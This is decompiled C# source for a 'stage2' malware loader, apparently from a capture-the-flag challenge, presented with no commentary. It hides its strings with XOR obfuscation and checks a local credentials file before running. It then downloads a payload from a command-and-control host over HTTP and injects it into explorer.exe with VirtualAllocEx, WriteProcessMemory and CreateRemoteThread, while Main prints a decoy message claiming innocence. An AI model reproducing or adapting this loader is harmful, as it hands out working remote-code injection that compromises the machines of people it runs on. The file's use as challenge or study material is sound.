// stage2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// E.C
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;

public class C
{
	public static readonly string ECSC;

	public static readonly string PATH;

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

	private static void Fun(byte[] buf)
	{
		Process process = Process.GetProcessesByName("explorer")[0];
		IntPtr hProcess = OpenProcess(2035711u, bInheritHandle: false, process.Id);
		IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, 4096u, 12288u, 64u);
		WriteProcessMemory(hProcess, intPtr, buf, buf.Length, out var _);
		CreateRemoteThread(hProcess, IntPtr.Zero, 0u, intPtr, IntPtr.Zero, 0u, IntPtr.Zero);
	}

	public static byte[] Ks(int n, string password)
	{
		byte[] array = new byte[n];
		uint num = 1337u;
		for (int i = 0; i < n; i++)
		{
			for (int j = 0; j < password.Length; j++)
			{
				num += (uint)((i * password[j]) ^ (j * password[i % password.Length]));
			}
			array[i] = (byte)(num & 0xFFu);
		}
		return array;
	}

	public static byte[] Bop(byte[] data)
	{
		byte[] array = new byte[data.Length];
		byte[] array2 = Ks(data.Length, ECSC);
		for (int i = 0; i < data.Length; i++)
		{
			array[i] = (byte)(array2[i] ^ data[i]);
		}
		return array;
	}

	public static string Str(byte[] data)
	{
		return Encoding.ASCII.GetString(Bop(data));
	}

	private unsafe static void TrustMeImAnEngineer(string data)
	{
		fixed (char* ptr = data)
		{
			for (int i = 0; i < data.Length; i++)
			{
				ptr[i] = (char)(ptr[i] ^ 1u);
			}
		}
	}

	static C()
	{
		ECSC = "NJ6WGgy3yHdkx0c`ojGW";
		PATH = "emf9v[JGi@m6rEBJOCB[";
		TrustMeImAnEngineer(ECSC);
		TrustMeImAnEngineer(PATH);
	}

	public static void SC(string c2)
	{
		string s = File.ReadAllText("C:\\Users\\Public\\Documents\\credentials.txt");
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		if (!Enumerable.SequenceEqual(second: Convert.FromBase64String("uOWIiZv8ed7f"), first: Bop(bytes)))
		{
			Process.GetCurrentProcess().Kill();
		}
		Str(Convert.FromBase64String("s/6mq5GxZ8HKJ91JN/3P7dd5auOx62xRLiBZPbCIut7hEwF3oB2+11x8"));
		Fun(new HttpClient().GetAsync("http://" + c2 + "/" + PATH).Result.Content.ReadAsByteArrayAsync().Result);
	}

	public static void Main(string[] argv)
	{
		Console.WriteLine("What flag are you talking about? I'm just an innocent program!");
	}
}
